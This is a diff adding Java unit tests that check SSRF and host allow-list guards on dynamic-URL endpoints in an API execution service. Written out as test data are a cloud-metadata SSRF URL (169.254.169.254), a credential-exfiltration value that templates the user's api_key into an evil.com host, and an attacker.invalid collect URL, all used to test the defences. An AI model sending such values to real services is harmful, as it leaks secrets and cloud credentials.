@@ -234,6 +234,158 @@ class HttpExecutionServiceTypedPathTest {
             verifyNoInteractions(restTemplate);
         }
 
+        // ── Dynamic-URL endpoint constraints (enforceDynamicUrlConstraints) ──
+        // When the endpoint path IS a {placeholder} (TikTok upload_url, WhatsApp
+        // media_url), the request host comes from a runtime parameter. All rejects
+        // must happen BEFORE any outbound call. Fixed-host endpoints are untouched,
+        // which the green legacy tests of this class pin (their host would fail DNS).
+
+        private ApiToolEntity dynamicUrlTool(String allowedSuffixesJson) {
+            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"json\""
+                    + (allowedSuffixesJson != null ? ",\"allowedUrlHostSuffixes\":" + allowedSuffixesJson : "")
+                    + "},\"response\":{\"type\":\"json\"}}";
+            ApiToolEntity tool = tool(spec);
+            tool.setMethod("PUT");
+            tool.setEndpoint("{upload_url}");
+            return tool;
+        }
+
+        private com.fasterxml.jackson.databind.node.ArrayNode uploadUrlParam(String value) {
+            com.fasterxml.jackson.databind.node.ArrayNode parameters = objectMapper.createArrayNode();
+            parameters.add(objectMapper.createObjectNode().put("upload_url", value));
+            return parameters;
+        }
+
+        @Test
+        @DisplayName("dynamic-URL + internal-address param → SSRF-rejected, no HTTP call")
+        void dynamicUrlEndpointRejectsInternalAddress() {
+            // Suffix matches the value's host so the reject is proven to come from the
+            // SSRF layer (private-range check), not from host pinning.
+            ApiToolEntity tool = dynamicUrlTool("[\"169.254.169.254\"]");
+
+            Map<String, Object> result = service.executeHttpCallTyped(
+                    api(), tool, uploadUrlParam("http://169.254.169.254/latest/meta-data/"),
+                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");
+
+            assertThat(result.get("success")).isEqualTo(false);
+            assertThat(result.get("error")).asString()
+                    .contains("private/internal network addresses are not allowed");
+            verifyNoInteractions(restTemplate);
+        }
+
+        /**
+         * Credential-exfiltration regression: a value like "https://{api_key}.evil.com/"
+         * passes a naive SSRF check (the validator skips DNS on templated hosts) and
+         * would then have the user's secret substituted into it by
+         * replaceUrlTemplateVariables further down the flow. Any residual '{' in a
+         * dynamic URL must be rejected before that substitution can ever happen.
+         */
+        @Test
+        @DisplayName("dynamic-URL + residual {placeholder} in value → rejected (credential-exfil regression)")
+        void dynamicUrlRejectsResidualPlaceholders() {
+            ApiToolEntity tool = dynamicUrlTool("[\"evil.com\"]");
+
+            Map<String, Object> result = service.executeHttpCallTyped(
+                    api(), tool, uploadUrlParam("https://{api_key}.evil.com/collect"),
+                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");
+
+            assertThat(result.get("success")).isEqualTo(false);
+            assertThat(result.get("error")).asString().contains("unresolved placeholders");
+            verifyNoInteractions(restTemplate);
+        }
+
+        @Test
+        @DisplayName("dynamic-URL + host outside the endpoint allow-list → rejected before any DNS")
+        void dynamicUrlRejectsHostOutsideAllowList() {
+            ApiToolEntity tool = dynamicUrlTool("[\"tiktokapis.com\"]");
+
+            // attacker.invalid does not resolve: reaching the pinning error (not a DNS
+            // error) proves the allow-list runs BEFORE any DNS resolution.
+            Map<String, Object> result = service.executeHttpCallTyped(
+                    api(), tool, uploadUrlParam("https://attacker.invalid/collect"),
+                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");
+
+            assertThat(result.get("success")).isEqualTo(false);
+            assertThat(result.get("error")).asString().contains("not among the endpoint's allowed hosts");
+            verifyNoInteractions(restTemplate);
+        }
+
+        @Test
+        @DisplayName("dynamic-URL endpoint without allowedUrlHostSuffixes → refused (fail-closed)")
+        void dynamicUrlWithoutAllowListIsRefused() {
+            ApiToolEntity tool = dynamicUrlTool(null);
+
+            Map<String, Object> result = service.executeHttpCallTyped(
+                    api(), tool, uploadUrlParam("https://open-upload.tiktokapis.com/video/?upload_id=1"),
+                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");
+
+            assertThat(result.get("success")).isEqualTo(false);
+            assertThat(result.get("error")).asString().contains("allowedUrlHostSuffixes");
+            verifyNoInteractions(restTemplate);
+        }
+
+        @Test
+        @DisplayName("dynamic-URL + missing URL param → clear 'unresolved placeholders' failure")
+        void dynamicUrlMissingParamFailsClearly() {
+            ApiToolEntity tool = dynamicUrlTool("[\"tiktokapis.com\"]");
+
+            Map<String, Object> result = service.executeHttpCallTyped(
+                    api(), tool, objectMapper.createArrayNode(),
+                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");
+
+            assertThat(result.get("success")).isEqualTo(false);
+            assertThat(result.get("error")).asString().contains("unresolved placeholders");
+            verifyNoInteractions(restTemplate);
+        }
+
+        /**
+         * Happy path: an allow-listed signed URL must reach the HTTP client
+         * BYTE-IDENTICAL - query string intact, nothing re-encoded, no credential
+         * template substituted. This is the integration seam where the URL could
+         * silently mutate between validation and the outbound request.
+         */
+        @Test
+        @DisplayName("dynamic-URL happy path → signed URI reaches the HTTP client byte-identical")
+        void dynamicUrlHappyPathSendsSignedUriVerbatim() {
+            ApiToolEntity tool = dynamicUrlTool("[\"tiktokapis.com\"]");
+
+            com.apimarketplace.catalog.domain.ApiToolParameterEntity verbatimParam =
+                    new com.apimarketplace.catalog.domain.ApiToolParameterEntity();
+            verbatimParam.setName("upload_url");
+            verbatimParam.setParameterType("path");
+            verbatimParam.setDataType("string");
+            verbatimParam.setExtras("{\"encoding\":\"verbatim\"}");
+            when(apiToolParameterRepository.findByApiToolId(tool.getId()))
+                    .thenReturn(java.util.List.of(verbatimParam));
+
+            String signedUrl = "https://open-upload.tiktokapis.com/video/?upload_id=v1.123&upload_token=Xza%2F1";
+            org.springframework.http.ResponseEntity<Object> resp =
+                    new org.springframework.http.ResponseEntity<>(
+                            new java.util.HashMap<>(), org.springframework.http.HttpStatus.OK);
+            when(restTemplate.exchange(any(java.net.URI.class), any(HttpMethod.class),
+                    any(), eq(Object.class))).thenReturn(resp);
+
+            // Static-mock the SSRF validator (prior art in HttpExecutionServiceTest):
+            // unit tests must not depend on live DNS for tiktokapis.com. Pinning and
+            // placeholder checks stay REAL - only the DNS-resolving layer is stubbed.
+            try (org.mockito.MockedStatic<com.apimarketplace.common.web.UrlSafetyValidator> urlValidator =
+                         org.mockito.Mockito.mockStatic(com.apimarketplace.common.web.UrlSafetyValidator.class)) {
+                urlValidator.when(() -> com.apimarketplace.common.web.UrlSafetyValidator
+                        .validateUrl(org.mockito.ArgumentMatchers.anyString())).thenAnswer(inv -> null);
+
+                Map<String, Object> result = service.executeHttpCallTyped(
+                        api(), tool, uploadUrlParam(signedUrl),
+                        new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");
+
+                assertThat(result.get("success")).isEqualTo(true);
+            }
+
+            org.mockito.ArgumentCaptor<java.net.URI> uriCaptor =
+                    org.mockito.ArgumentCaptor.forClass(java.net.URI.class);
+            verify(restTemplate).exchange(uriCaptor.capture(), eq(HttpMethod.PUT), any(), eq(Object.class));
+            assertThat(uriCaptor.getValue().toString()).isEqualTo(signedUrl);
+        }
+
         @Test
         @DisplayName("mode=foo (unknown) → fail-fast with explicit message")
         void unknownModeRejected() {
